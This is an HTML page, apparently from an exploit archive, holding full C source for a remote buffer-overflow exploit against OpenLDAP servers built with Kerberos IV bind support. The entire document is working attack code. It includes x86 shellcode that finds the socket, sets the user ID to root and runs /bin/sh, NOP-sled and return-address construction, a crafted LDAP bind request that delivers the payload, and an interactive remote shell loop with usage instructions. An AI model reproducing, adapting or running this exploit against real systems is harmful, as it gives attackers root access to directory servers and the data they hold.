<html><head><title>OpenLDAP <= 2.4.3 (KBIND) Remote Buffer Overflow Exploit</title></head><pre>/*
 * openldap-kbind-p00f.c - OpenLDAP kbind remote exploit
 *
 * Only works on servers compiled with
 *   --enable-kbind    enable LDAPv2+ Kerberos IV bind (deprecated) [no]
 *
 * by Solar Eclipse &lt;solareclipse@phreedom.org&gt;
 *
 * Shoutouts to LSD for their l33t asm code and to all 0dd people
 *
 * Private 0dd code.
 *
 */

#include &lt;arpa/inet.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;errno.h&gt;
#include &lt;stdio.h&gt;

extern int errno;

#define SHELLCODE_LEN (1250+2+32)
#define SHELLCODE_ADDR 0xbf5feed0

#define LDAP_AUTH_SIMPLE	0x80U
#define LDAP_AUTH_KRBV41	0x81U

#define FINDSCKPORTOFS     46

u_char shellcode[]=
/* 72 bytes findsckcode by LSD-pl */
    &quot;\x31\xdb&quot;             /* xorl    %ebx,%ebx              */
    &quot;\x89\xe7&quot;             /* movl    %esp,%edi              */
    &quot;\x8d\x77\x10&quot;         /* leal    0x10(%edi),%esi        */
    &quot;\x89\x77\x04&quot;         /* movl    %esi,0x4(%edi)         */
    &quot;\x8d\x4f\x20&quot;         /* leal    0x20(%edi),%ecx        */
    &quot;\x89\x4f\x08&quot;         /* movl    %ecx,0x8(%edi)         */
    &quot;\xb3\x10&quot;             /* movb    $0x10,%bl              */
    &quot;\x89\x19&quot;             /* movl    %ebx,(%ecx)            */
    &quot;\x31\xc9&quot;             /* xorl    %ecx,%ecx              */
    &quot;\xb1\xff&quot;             /* movb    $0xff,%cl              */
    &quot;\x89\x0f&quot;             /* movl    %ecx,(%edi)            */
    &quot;\x51&quot;                 /* pushl   %ecx                   */
    &quot;\x31\xc0&quot;             /* xorl    %eax,%eax              */
    &quot;\xb0\x66&quot;             /* movb    $0x66,%al              */
    &quot;\xb3\x07&quot;             /* movb    $0x07,%bl              */
    &quot;\x89\xf9&quot;             /* movl    %edi,%ecx              */
    &quot;\xcd\x80&quot;             /* int     $0x80                  */
    &quot;\x59&quot;                 /* popl    %ecx                   */
    &quot;\x31\xdb&quot;             /* xorl    %ebx,%ebx              */
    &quot;\x39\xd8&quot;             /* cmpl    %ebx,%eax              */
    &quot;\x75\x0a&quot;             /* jne     &lt;findsckcode+54&gt;       */
    &quot;\x66\xb8\x12\x34&quot;     /* movw    $0x1234,%bx            */
    &quot;\x66\x39\x46\x02&quot;     /* cmpw    %bx,0x2(%esi)          */
    &quot;\x74\x02&quot;             /* je      &lt;findsckcode+56&gt;       */
    &quot;\xe2\xe0&quot;             /* loop    &lt;findsckcode+24&gt;       */
    &quot;\x89\xcb&quot;             /* movl    %ecx,%ebx              */
    &quot;\x31\xc9&quot;             /* xorl    %ecx,%ecx              */
    &quot;\xb1\x03&quot;             /* movb    $0x03,%cl              */
    &quot;\x31\xc0&quot;             /* xorl    %eax,%eax              */
    &quot;\xb0\x3f&quot;             /* movb    $0x3f,%al              */
    &quot;\x49&quot;                 /* decl    %ecx                   */
    &quot;\xcd\x80&quot;             /* int     $0x80                  */
    &quot;\x41&quot;                 /* incl    %ecx                   */
    &quot;\xe2\xf6&quot;             /* loop    &lt;findsckcode+62&gt;       */

/* 10 byte setresuid(0,0,0); by core */
    &quot;\x31\xc9&quot;       /* xor    %ecx,%ecx */
    &quot;\xf7\xe1&quot;       /* mul    %ecx,%eax */
    &quot;\x51&quot;           /* push   %ecx */
    &quot;\x5b&quot;           /* pop    %ebx */
    &quot;\xb0\xa4&quot;       /* mov    $0xa4,%al */
    &quot;\xcd\x80&quot;       /* int    $0x80 */

/* 24 bytes execl(&quot;/bin/sh&quot;, &quot;/bin/sh&quot;, 0); by LSD-pl */
    &quot;\x31\xc0&quot;             /* xorl    %eax,%eax              */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\x68&quot;&quot;//sh&quot;           /* pushl   $0x68732f2f            */
    &quot;\x68&quot;&quot;/bin&quot;           /* pushl   $0x6e69622f            */
    &quot;\x89\xe3&quot;             /* movl    %esp,%ebx              */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\x53&quot;                 /* pushl   %ebx                   */
    &quot;\x89\xe1&quot;             /* movl    %esp,%ecx              */
    &quot;\x99&quot;                 /* cdql                           */
    &quot;\xb0\x0b&quot;             /* movb    $0x0b,%al              */
    &quot;\xcd\x80&quot;             /* int     $0x80                  */
;

#define COMMAND1 &quot;echo 'a'; TERM=xterm; export TERM=xterm; exec bash -i;\n&quot;
#define COMMAND2 &quot;uname -a; id; w;\n&quot;

/* mixter's code w/enhancements by core */

int sh(int sockfd) {
   char snd[1024], rcv[1024];
   fd_set rset;
   int maxfd, n;

   /* Priming commands */
   strcpy(snd, COMMAND1 &quot;\n&quot;);
   write(sockfd, snd, strlen(snd));

   strcpy(snd, COMMAND2 &quot;\n&quot;);
   write(sockfd, snd, strlen(snd));

   /* Main command loop */
   for (;;) {
      FD_SET(fileno(stdin), &amp;rset);
      FD_SET(sockfd, &amp;rset);
      
      maxfd = ( ( fileno(stdin) &gt; sockfd )?fileno(stdin):sockfd ) + 1;
      select(maxfd, &amp;rset, NULL, NULL, NULL);
      
      if (FD_ISSET(fileno(stdin), &amp;rset)) {
	 bzero(snd, sizeof(snd));
	 fgets(snd, sizeof(snd)-2, stdin);
	 write(sockfd, snd, strlen(snd));
      }
      
      if (FD_ISSET(sockfd, &amp;rset)) {
	 bzero(rcv, sizeof(rcv));
	 
	 if ((n = read(sockfd, rcv, sizeof(rcv))) == 0) {
	    printf(&quot;Good Bye!\n&quot;);
	    return 0;
	 }
	 
	 if (n &lt; 0) {
	    perror(&quot;read&quot;);
	    return 1;
	 }
	 
	 fputs(rcv, stdout);
	 fflush(stdout); /* keeps output nice */
      }
   } /* for(;;) */
}

/* Connect to the host */
int connect_host(char* host, int port)
{
	struct sockaddr_in s_in;
	int sock;

	s_in.sin_family = AF_INET;
	s_in.sin_addr.s_addr = inet_addr(host);
	s_in.sin_port = htons(port);

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) &lt;= 0) {
		printf(&quot;Could not create a socket\n&quot;);
		exit(1);
	}

	if (connect(sock, (struct sockaddr *)&amp;s_in, sizeof(s_in)) &lt; 0) {
		printf(&quot;Connection to %s:%d failed: %s\n&quot;, host, port, strerror(errno));
		exit(1);
	}

	return sock;
}

int get_local_port(int sock)
{
	struct sockaddr_in s_in;
	int namelen = sizeof(s_in);
	
	if (getsockname(sock, (struct sockaddr *)&amp;s_in, &amp;namelen) &lt; 0) {
		printf(&quot;Can't get local port: %s\n&quot;, strerror(errno));
		exit(1);
	}

	return s_in.sin_port;
}

int read_data(int sock, char* buf, int len)
{
	int l;
	int to_read = len;

	do {
		if ((l = read(sock, buf, to_read)) &lt; 0) {
			printf(&quot;Error in read: %s\n&quot;, strerror(errno));
			exit(1);
		}
		to_read -= len;
	} while (to_read &gt; 0);

	return len;
}

int read_bind_result(int sock)
{
	char buf[1000];

	read_data(sock, buf, 2);
	if (buf[0] != 0x30) {
		/* openldap is 0wned  :-P */
		return -1;
	}

	read_data(sock, &amp;buf[2], buf[1]);
	
	if ((buf[2] != 0x02) &amp;&amp; (buf[3] != 0x01)) {	/* message id */
		printf(&quot;Malformed bind result\n&quot;);
		exit(1);
	}

	if (buf[5] != 0x61) {						/* message type */
		printf(&quot;Malformed bind result\n&quot;);
		exit(1);
	}

	if (buf[6] &lt; 7) {							/* message length */
		printf(&quot;Malformed bind result\n&quot;);
		exit(1);
	}

	if ((buf[7] != 0x0a) &amp;&amp; (buf[8] != 0x01)) {	/* result code */
		printf(&quot;Malformed bind result\n&quot;);
		exit(1);
	}

	return buf[9];		/* result code */
}

int send_bind_request(int sock, char method, char* dn, char* cred)
{
	int cred_len, message_len, request_len;
	char krb_bind_request[2000];
	char* p;

	memcpy(krb_bind_request,
		&quot;\x30\x82\xff\xff&quot;	/* request length */
		&quot;\x02\x01\x01&quot;		/* message id = 1 */
		&quot;\x60&quot;				/* bind request */
		&quot;\x82\xff\xff&quot;		/* message length */
		&quot;\x02\x01\x02&quot;		/* LDAP version 3 */
		&quot;\x04&quot;,				/* dn */
	15);
	
	p = &amp;krb_bind_request[15];
	
	if (strlen(dn) &gt; 255) {
		printf(&quot;bind_dn too long\n&quot;);
		exit(1);
	}

	*p++ = (char)strlen(dn);
	strcpy(p, dn);

	p += strlen(dn);
	
	*p++ = method;		/* authentication method */
	*p++ = '\x82';

	cred_len = strlen(cred);
	
	*p++ = (char) ((cred_len &gt;&gt; 8) &amp; 0xff);
	*p++ = (char) (cred_len &amp; 0xff);
	
	strcpy(p, cred);
	
	message_len = 5 + strlen(dn) + 4 + cred_len;
	krb_bind_request[9] = (char) ((message_len &gt;&gt; 8) &amp; 0xff);
	krb_bind_request[10] = (char) (message_len &amp; 0xff);

	request_len = 7 + message_len;
	krb_bind_request[2] = (char) ((request_len &gt;&gt; 8) &amp; 0xff);
	krb_bind_request[3] = (char) (request_len &amp; 0xff);
	
	send(sock, krb_bind_request, 4+request_len, 0);
}

void build_shellcode(char* p, int len)
{
	int i;

	i = len - 64 - strlen(shellcode);
	memset(p, 0x90, i);
	strncpy(&amp;p[i], shellcode, strlen(shellcode));

	for (i = len - 64; i &lt; len; i+= 4) {
		*(int*)&amp;p[i] = SHELLCODE_ADDR;
	}
}

char res_buf[30];

char* ldap_result(int code) {
	switch (code) {
		case 0x00:	return &quot;LDAP_SUCCESS (0x00)&quot;;
		case 0x01:	return &quot;LDAP_OPERATIONS_ERROR (0x01)&quot;;
		case 0x02:	return &quot;LDAP_PROTOCOL_ERROR (0x02)&quot;;
		case 0x07:	return &quot;LDAP_AUTH_METHOD_NOT_SUPPORTED (0x07)\nMost likely cause: the OpenLDAP server was not compiled with --enable-kbind.&quot;;
		case 0x08:	return &quot;LDAP_STRONG_AUTH_REQUIRED (0x08)&quot;;
		case 0x0e:	return &quot;LDAP_SASL_BIND_IN_PROGRESS (0x0e)&quot;;
		case 0x22:	return &quot;LDAP_INVALID_DN_SYNTAX (0x22)\nCheck your bind_dn.&quot;;
		case 0x30:	return &quot;LDAP_INAPPROPRIATE_AUTH (0x30)&quot;;
		case 0x31:	return &quot;LDAP_INVALID_CREDENTIALS (0x31)\nThe bind_dn must exist in the LDAP directory.&quot;;
		case 0x32:	return &quot;LDAP_INSUFFICIENT_ACCESS (0x32)&quot;;
		case 0x33:	return &quot;LDAP_BUSY (0x33)&quot;;
		case 0x34:	return &quot;LDAP_UNAVAILABLE (0x34)&quot;;
		case 0x35:	return &quot;LDAP_UNWILLING_TO_PERFORM (0x35)&quot;;
		case 0x50:	return &quot;LDAP_OTHER (0x50)&quot;;
		case 0x51:	return &quot;LDAP_SERVER_DOWN (0x51)&quot;;
		case 0x54:	return &quot;LDAP_DECODING_ERROR (0x54)&quot;;
	default:
		sprintf(res_buf, &quot;%x&quot;, code);
		return res_buf;
	}
}

/* run, code, run */
int main(int argc, char* argv[])
{
	char shellcode_buf[SHELLCODE_LEN+1];
	int port, sock, res;
	char* dn;
	char* p;

	printf(&quot;: openldap-kbind-p00f.c - OpenLDAP kbind remote exploit\n&quot;);
	printf(&quot;\n&quot;);
	printf(&quot;: Only works on servers compiled with\n&quot;);
	printf(&quot;    --enable-kbind    enable LDAPv2+ Kerberos IV bind (deprecated) [no]\n&quot;);
	printf(&quot;\n&quot;);
	printf(&quot;: by Solar Eclipse &lt;solareclipse@phreedom.org&gt;\n\n&quot;);
	
	if (argc &lt; 3) {
		printf(&quot;: Usage: %s hostname bind_dn\n&quot;, argv[0]);
		printf(&quot;  The bind_dn must exist in the LDAP directory.\n&quot;);
		exit(1);
	}

	dn = argv[2];

	port = 389; /*atoi(argv[2]);*/
	sock = connect_host(argv[1], port);

/*
	send_bind_request(sock, LDAP_AUTH_SIMPLE, dn, &quot;secret&quot;);
	res = read_bind_result(sock);
	printf(&quot;LDAP_AUTH_SIMPLE bind request returned %s\n&quot;, ldap_result(res));
*/

/*	send_bind_request(sock, LDAP_AUTH_KRBV41, dn, &quot;secret&quot;);
	res = read_bind_result(sock);
	printf(&quot;LDAP_AUTH_KRBV41 bind request returned %s\n&quot;, ldap_result(res));	
*/
	port = get_local_port(sock);

	shellcode[FINDSCKPORTOFS] = (char) (port &amp; 0xff);
	shellcode[FINDSCKPORTOFS+1] = (char) ((port &gt;&gt; 8) &amp; 0xff);

	build_shellcode(shellcode_buf, SHELLCODE_LEN);
	shellcode_buf[SHELLCODE_LEN] = '\0';

	printf(&quot;Sending shellcode\n&quot;);
	send_bind_request(sock, LDAP_AUTH_KRBV41, dn, shellcode_buf);
	
	sleep(2);

	/* Priming commands */
	write(sock, &quot;echo 'a';\n&quot;, 10);

	printf(&quot;Reading bind result\n&quot;);
	res = read_bind_result(sock);
	if (res &gt; 0)
		printf(&quot;LDAP_AUTH_KRBV41 bind request returned %s\n&quot;, ldap_result(res));
	else {
		printf(&quot;Spawning shell...\n&quot;);
		sh(sock);
	}

	close(sock);
	
	return 0;
}

// milw0rm.com [2006-12-15]</pre></html>